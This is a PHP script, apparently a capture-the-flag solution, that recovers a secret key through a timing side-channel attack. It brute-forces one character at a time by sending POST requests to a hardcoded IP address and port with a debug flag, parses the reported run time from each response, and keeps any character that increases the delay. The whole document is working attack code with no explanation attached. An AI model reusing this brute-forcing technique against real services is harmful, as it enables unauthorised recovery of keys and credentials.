<?php 

$c = "abcdefghijklmnopqrstuvwxyz0123456789"; // charset
$l = 1; // string length
$key='';

$input=readline();

while(1)
{
	$timeold=post($key);
	for($t='',$cl=strlen($c),$s=array_fill(0,$l,0),$i=pow($cl,$l);$a=0,$i--;) 
	{
		for($t;$a<$l;$t.=$c[$s[$a++]]);
		
		//echo $key.$t."\n";
		$time=post($key.$t);
		//echo $time." ". ($time-$timeold) ."\n";
		
		if ($time-$timeold >0.01)
		{
			$key=$key.$t;
			break;
		}
		
		$t='';
		$timeold=$time;
		for(;$a--&&++$s[$a]==$cl;$s[$a]=0);
	}
}
function post($key)
{
	global $input;
	$fields = array(
	'input' => $input,
	'key' => $key
	);
	
	$options = array(
		'http' => array(
		'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
		'method'  => 'POST',
		'content' => http_build_query($fields),
		),
	);
	$context  = stream_context_create($options);

	$response = file_get_contents('http://54.83.207.90:4242/?input='.$input.'&debug=1',false, $context);
	preg_match("/Total\srun.\s(.*)/",$response,$match);
	
	if (!isset($match[1]))
	{
		echo $key."\n";
		exit(0);
	}
	return $match[1];
	//echo $response;
}
?>